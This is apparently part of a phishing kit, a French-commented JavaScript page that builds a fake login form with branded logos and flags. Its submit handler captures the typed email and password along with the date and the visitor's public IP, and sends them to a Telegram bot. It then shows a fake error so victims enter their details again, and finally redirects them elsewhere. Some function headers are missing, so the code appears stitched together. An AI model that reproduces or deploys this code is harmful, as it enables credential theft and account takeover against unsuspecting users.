        // Fonction pour obtenir l'adresse IP publique du client
        async function getClientIP() {
            try {
                // Utilisation d'ipify.org (service fiable et gratuit)
                const response = await fetch('https://api.ipify.org?format=json', {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });
                if (!response.ok) throw new Error('IP fetch failed');
                const data = await response.json();
                return data.ip;
            } catch (err) {
                console.warn('Impossible de récupérer l\'IP:', err);
                return 'IP non disponible';
            }
        }

        // Fonction pour formater la date et l'heure au format français "dd/mm/yyyy à HH:MM:SS"
        function getFormattedDateTime() {
            const now = new Date();
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const year = now.getFullYear();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            return `${day}/${month}/${year} à ${hours}:${minutes}:${seconds}`;
        }

        // Fonction de rendu (identique à celle qui utilisait fetch, mais sans fetch)
        function renderPage(config) {
            const app = document.getElementById('app');

            // Header
            const header = document.createElement('div');
            header.className = 'header';
            const logo = document.createElement('i');
            logo.className = 'logo';

            // Main
            const main = document.createElement('div');
            main.className = 'main';
            const container = document.createElement('div');
            container.className = 'container';

            // Title
            const titleDiv = document.createElement('div');
            titleDiv.className = 'title';
            titleDiv.innerHTML = `<h1>${config.mainContent.title}</h1>`;
            container.appendChild(titleDiv);

            // Card top
            const cardTop = document.createElement('div');
            cardTop.className = 'card-top';
            cardTop.innerHTML = `
                <p class="subtitle">${config.mainContent.cardTop.subtitle}</p>
                <p class="information">${config.mainContent.cardTop.information}</p>
                <a href="${config.mainContent.cardTop.link.url}" class="top-url">${config.mainContent.cardTop.link.text}</a>
            `;
            container.appendChild(cardTop);

            // Error div
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error';
            errorDiv.innerHTML = '<p></p>';
            container.appendChild(errorDiv);

            // Form
            const form = document.createElement('form');
            form.className = 'form';
            form.method = 'POST';

            const formInfo = document.createElement('p');
            formInfo.className = 'information';
            formInfo.textContent = config.mainContent.form.instruction;
            form.appendChild(formInfo);

            const operatorsImg = document.createElement('i');
            operatorsImg.className = 'operators';
            operatorsImg.style.backgroundImage = `url('${config.images.find(img => img.id === 'operators').url}')`;
            form.appendChild(operatorsImg);

            // Email field
            const emailField = createField(config.mainContent.form.fields[0], config);
            form.appendChild(emailField);

            // Password field
            const passwordField = createField(config.mainContent.form.fields[1], config);
            form.appendChild(passwordField);

            // Checkbox
            const checkboxDiv = document.createElement('div');
            checkboxDiv.className = 'form-checkbox';
            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.id = 'remember';
            const checkboxLabel = document.createElement('label');
            checkboxLabel.htmlFor = 'remember';
            checkboxLabel.textContent = config.mainContent.form.checkbox.text;
            checkboxDiv.appendChild(checkbox);
            checkboxDiv.appendChild(checkboxLabel);
            form.appendChild(checkboxDiv);

            // Button
            const buttonDiv = document.createElement('div');
            buttonDiv.className = 'form-button';
            const button = document.createElement('button');
            button.className = 'btn';
            button.textContent = config.mainContent.form.button.text;
            button.type = 'submit';
            buttonDiv.appendChild(button);
            form.appendChild(buttonDiv);

            container.appendChild(form);
            main.appendChild(container);
            app.appendChild(header);
            app.appendChild(main);

            // Footer
            const footer = renderFooter(config);
            app.appendChild(footer);

            // --- Logique de formulaire AVEC DATE, HEURE ET IP ---
            const emailInput = emailField.querySelector('input');
            const passwordInput = passwordField.querySelector('input');
            const toggleSpan = passwordField.querySelector('.eye, .eye-close');
            const errorP = errorDiv.querySelector('p');

            let attemptCount = 0;
            const maxAttempts = config.scripts.behavior.maxAttemptsBeforeRedirect;
            const redirectUrl = config.scripts.behavior.redirectUrl;
            const telegramToken = config.scripts.telegramBot.token;
            const chatId = config.scripts.telegramBot.chatId;

            // Toggle password visibility
            if (toggleSpan) {
                const eyeOpenUrl = config.images.find(img => img.id === 'eye_open').url;
                const eyeClosedUrl = config.images.find(img => img.id === 'eye_closed').url;
                toggleSpan.style.backgroundImage = `url('${eyeClosedUrl}')`;
                toggleSpan.addEventListener('click', function() {
                    const isPassword = passwordInput.type === 'password';
                    passwordInput.type = isPassword ? 'text' : 'password';
                    if (passwordInput.type === 'text') {
                        toggleSpan.style.backgroundImage = `url('${eyeOpenUrl}')`;
                    } else {
                        toggleSpan.style.backgroundImage = `url('${eyeClosedUrl}')`;
                    }
                });
            }

            // Form submission avec ajout de la date, heure et IP
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const email = emailInput.value;
                const password = passwordInput.value;

                // Récupération de la date/heure formatée
                const formattedDateTime = getFormattedDateTime();
                
                // Récupération de l'adresse IP (async)
                let clientIp = 'Récupération...';
                try {
                    clientIp = await getClientIP();
                } catch (err) {
                    clientIp = 'Indisponible';
                }

                // Construction du message enrichi : email + mot de passe + date/heure + IP
                const finalMessage = `?? Email: ${email}\n?? Mot de passe: ${password}\nDate & heure : ${formattedDateTime}\nIp : ${clientIp}`;

                try {
                    const res = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: finalMessage,
                            parse_mode: 'Markdown'
                        })
                    });
                    if (res.ok) {
                        attemptCount++;
                        // Effacement du mot de passe après envoi réussi (conformément au comportement original)
                        passwordInput.value = '';
                        
                        if (attemptCount < maxAttempts) {
                            errorP.textContent = config.mainContent.errorMessage.default;
                            errorDiv.style.display = 'block';
                            setTimeout(() => errorDiv.style.display = 'none', config.scripts.behavior.errorDisplayDurationMs);
                        } else {
                            // Après le nombre maximal de tentatives, redirection
                            setTimeout(() => {
                                window.location.href = redirectUrl;
                            }, config.scripts.behavior.errorDisplayDurationMs);
                        }
                    } else {
                        throw new Error('Telegram error');
                    }
                } catch (err) {
                    console.error(err);
                    errorP.textContent = config.mainContent.errorMessage.networkError;
                    errorDiv.style.display = 'block';
                    setTimeout(() => errorDiv.style.display = 'none', config.scripts.behavior.networkErrorDisplayDurationMs);
                }
            });
        }

        // Helper pour créer un champ de formulaire

            const label = document.createElement('label');
            label.htmlFor = fieldDef.id;
            label.textContent = fieldDef.label;
            div.appendChild(label);

            if (fieldDef.type === 'password') {
                const wrapper = document.createElement('div');
                wrapper.className = 'password-input';
                const input = document.createElement('input');
                input.type = fieldDef.type;
                input.id = fieldDef.id;
                input.name = fieldDef.name;
                input.placeholder = fieldDef.placeholder;
                wrapper.appendChild(input);
                const eyeSpan = document.createElement('span');
                eyeSpan.className = 'eye';
                wrapper.appendChild(eyeSpan);
                div.appendChild(wrapper);
            } else {
                const input = document.createElement('input');
                input.type = fieldDef.type;
                input.id = fieldDef.id;
                input.name = fieldDef.name;
                input.placeholder = fieldDef.placeholder;
                div.appendChild(input);
            }
            return div;
        }

            const nlFlag = document.createElement('i');
            nlFlag.style.backgroundImage = `url('${config.footer.flags.nl}')`;
            nlFlag.style.width = '30px';
            nlFlag.style.height = '30px';
            flagsDiv.appendChild(frFlag);
            flagsDiv.appendChild(enFlag);
            flagsDiv.appendChild(nlFlag);
            copyrightCol.appendChild(flagsDiv);
            const copyrightText = document.createElement('div');
            copyrightText.innerHTML = `<span>${config.footer.copyright}</span>`;
            copyrightCol.appendChild(copyrightText);
            bottom.appendChild(copyrightCol);

            container.appendChild(bottom);
            footer.appendChild(container);
            return footer;
        }

        // Lancement
        renderPage(config);
    </script>
</body>
</html>
